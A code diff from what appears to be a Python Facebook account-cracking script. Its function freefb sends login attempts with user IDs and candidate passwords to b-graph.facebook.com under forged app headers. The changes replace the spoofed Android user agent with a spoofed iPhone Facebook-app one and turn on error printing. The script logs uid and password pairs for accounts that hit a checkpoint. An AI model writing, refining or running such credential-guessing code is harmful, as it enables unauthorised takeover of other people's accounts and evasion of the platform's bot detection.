@@ -73,7 +73,7 @@ def freefb(uid, name, pwx, tl):
     'X-FB-Connection-Quality': 'GOOD',
     'X-FB-SIM-HNI': '47007',
     'X-FB-Net-HNI': '47002',
-    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 14; TECNO CK7n Build/UP1A.231005.007) [FBAN/FB4A;FBAV/370.0.0.23.112;FBPN/com.facebook.katana;FBLC/en_US;FBBV/374931177;FBCR/Airtel;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CK7n;FBSV/14;FBCA/arm64-v8a:null;FBDM/{density=2.7375,width=1080,height=2292};FB_FW/1;FBRV/0;]',
+    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23F77 Safari/604.1 [FBAN/FBIOS;FBAV/563.0.0.67.72;FBBV/980285082;FBDV/iPhone14,4;FBMD/iPhone;FBSN/iOS;FBSV/26.5;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/985583719;IABMV/1]',
     # 'Content-Encoding': 'gzip',  # REMOVED - requests handles this automatically
     'Host': 'b-graph.facebook.com',
     'Content-Type': 'application/x-www-form-urlencoded',
@@ -152,7 +152,7 @@ def freefb(uid, name, pwx, tl):
                             
                 elif 'error' in q:
                   error_msg = q['error'].get('message', '')
-                  #print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
+                  print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
                   if 'www.facebook.com' in error_msg:
                       print(f"\n\033[1;33m⚠️ [CP] {uid} | {pw}\033[1;37m")
                       cps.append(uid)
